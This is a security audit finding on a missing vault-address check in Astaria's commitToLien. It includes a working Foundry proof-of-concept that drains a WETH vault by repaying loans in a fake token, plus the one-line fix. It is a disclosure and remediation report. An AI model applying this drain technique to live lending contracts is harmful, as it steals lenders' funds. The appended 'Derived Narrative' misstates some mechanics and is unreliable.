---
id: 17890
severity: "High"
---

# Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault

## Description

When a borrower takes a loan, Strategy details are passed along with other required data, and through the overall **commitToLien** flow, all the data are validated except the StrategyDetailsParam.vault

```solidity
  struct StrategyDetailsParam {
    uint8 version;
    uint256 deadline;
    address vault;
  }
```

A borrower then can pass different vault’s address, and when creating a lien this vault is considered. Later, the borrower makes a payment, it reads the asset from this vault. Thus, the borrower can take loans and repay with whatever token.

## Proof of Concept

1. Please create a file with a name **StealAllFundsExploit.t.sol** under **src/test/** directory.
2. Add the following code to the file.

```solidity
pragma solidity =0.8.17;

import "forge-std/Test.sol";

import {Authority} from "solmate/auth/Auth.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {MockERC721} from "solmate/test/utils/mocks/MockERC721.sol";
import {
  MultiRolesAuthority
} from "solmate/auth/authorities/MultiRolesAuthority.sol";

import {ERC721} from "gpl/ERC721.sol";
import {SafeCastLib} from "gpl/utils/SafeCastLib.sol";
import {IAstariaRouter, AstariaRouter} from "../AstariaRouter.sol";
import {VaultImplementation} from "../VaultImplementation.sol";
import {PublicVault} from "../PublicVault.sol";
import {TransferProxy} from "../TransferProxy.sol";
import {WithdrawProxy} from "../WithdrawProxy.sol";
import "./TestHelpers.t.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {IVaultImplementation} from "../interfaces/IVaultImplementation.sol";

contract AstariaTest is TestHelpers {
  using FixedPointMathLib for uint256;
  using CollateralLookup for address;
  using SafeCastLib for uint256;

  ILienToken.Details public lienDetails =
      ILienToken.Details({
        maxAmount: 50 ether,
        rate: (uint256(1e16) * 150) / (365 days),
        duration: 10 days,
        maxPotentialDebt: 50 ether,
        liquidationInitialAsk: 500 ether
      });

  function __createPrivateVault(address strategist, address delegate,address token)
    internal
    returns (address privateVault)
  {
    vm.startPrank(strategist);
    privateVault = ASTARIA_ROUTER.newVault(delegate, token);
    vm.stopPrank();
  }    

  function testPayWithDifferentAsset() public {
    TestNFT nft = new TestNFT(2);
    address tokenContract = address(nft);
    uint256 initialBalance = WETH9.balanceOf(address(this));

    // Create a private vault with WETH asset
    address privateVault = __createPrivateVault({
      strategist: strategistOne,
      delegate: address(0),
      token: address(WETH9)
    });

    _lendToPrivateVault(
      Lender({addr: strategistOne, amountToLend: 500 ether}),
      privateVault
    );
    
    // Send the NFT to Collateral contract and receive Collateral token
    ERC721(tokenContract).safeTransferFrom(address(this),address(COLLATERAL_TOKEN),1,"");

    // generate valid terms
    uint256 amount = 50 ether; // amount to borrow        
    IAstariaRouter.Commitment memory c = _generateValidTerms({
      vault: privateVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: 1,
      lienDetails: lienDetails,
      amount: amount,
      stack: new ILienToken.Stack[](0)
    });

    // Attack starts here
    // The borrower an asset which has no value in the market
    MockERC20 FakeToken = new MockERC20("USDC", "FakeAsset", 18); // this could be any ERC token created by the attacker
    FakeToken.mint(address(this),500 ether);
    // The borrower creates a private vault with his/her asset
    address privateVaultOfBorrower = __createPrivateVault({
      strategist: address(this),
      delegate: address(0),
      token: address(FakeToken)
    });

    uint8 i;
    for( ; i < 10 ; i ++) {
      // Here is the exploit: commitToLien on privateVault while passing differentVault in the strategy
      c.lienRequest.strategy.vault = privateVaultOfBorrower;   
      (uint256 lienId, ILienToken.Stack[] memory stack , uint256 payout) = IVaultImplementation(privateVault).commitToLien(
          c,
          address(this)
      );
      console.log("Take 50 ether loan#%d", (i+1));

      // necessary approvals
      FakeToken.approve(address(TRANSFER_PROXY), amount);
      FakeToken.approve(address(LIEN_TOKEN), amount);

      // pay the loan with FakeToken 
      ILienToken.Stack[] memory newStack = LIEN_TOKEN.makePayment(
        stack[0].lien.collateralId,
        stack,
        uint8(0),
        amount
      );
      console.log("Repay 50 FakeToken loan#%d", (i+1));
    }

    // assertion
    console.log("------");
    // Vault is drained
    console.log("PrivateVault Balance: %d WETH", WETH9.balanceOf(privateVault));
    assertEq(WETH9.balanceOf(privateVault), 0); 
    // The borrower gets 500 ether
    console.log("Borrower Balance: %d WETH", WETH9.balanceOf(address(this)));
    assertEq(WETH9.balanceOf(address(this)), initialBalance + 500 ether);
    // strategist receives the fake token
    console.log("Strategist Balance: %d FakeToken", FakeToken.balanceOf(strategistOne));
    assertEq(FakeToken.balanceOf(strategistOne), 500 ether);

  }
 
}
```

3. Then run the forge test command as follows (replace `$FORK_URL` with your RPC URL):

forge test --ffi --fork-url $FORK_URL --fork-block-number 15934974 --match-path src/test/StealAllFundsExploit.t.sol -vv

The test will pass. I’ve added comments in the code explaining the steps.

Note: The attack isn’t possible when using AstariaRouter

## Recommendation

In VaultImplementation’s `commitToLien` function, add the following validation:

```solidity
  require(address(this) == params.lienRequest.strategy.vault,"INVALID VAULT");
```

Run the PoC test above again, and `testPayWithDifferentAsset` should fail.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an unchecked vault address in the StrategyDetailsParam structure that is passed to the commitToLien function of a vault implementation. The struct contains a version, a deadline and an address called vault, but the contract never verifies that this address matches the vault instance that is executing the function. Because of this missing validation a borrower can supply the address of a different vault that they control when creating a lien. The commitToLien flow records the supplied vault address and later, when the borrower makes a payment, the contract reads the asset balance from the attacker‑controlled vault instead of the original vault that holds the collateral. As a result the borrower can take a loan that is backed by a legitimate asset (for example WETH) from the victim vault, and then repay the debt using any token they choose from their own vault, such as a freshly minted fake ERC‑20. The repayment logic accepts the payment because it only checks that the amount is transferred, not that the token matches the original collateral. Consequently the original vault’s balance is drained to zero while the borrower ends up with the full amount of the borrowed asset. The impact is that funds belonging to lenders and the protocol can disappear, the collateral vault becomes empty, and the borrower walks away with the loaned amount plus any fake tokens they minted. The issue occurs whenever commitToLien is called with a StrategyDetailsParam that contains a vault field, which is the case for every loan creation, and it is triggered only when the attacker deliberately overwrites the vault field before the payment step. All participants that rely on the vault’s accounting – borrowers, lenders, and any downstream contracts – are affected because the accounting assumptions that the vault’s balance reflects the collateral are broken. The flaw was discovered during a security audit that examined the data flow of the loan lifecycle and identified that the vault address was never compared against the contract’s own address. It is easy to miss because the vault field looks like a harmless piece of metadata and the contract’s external interface does not expose any explicit check, so normal testing with correct parameters passes. To remediate the issue the contract should enforce that the strategy’s vault address equals address(this) at the beginning of commitToLien, rejecting any request that references a different vault. This simple validation restores the invariant that the vault handling the loan is also the source of the collateral and prevents an attacker from redirecting repayments to an arbitrary token holder, thereby preserving the intended accounting and protecting user funds.
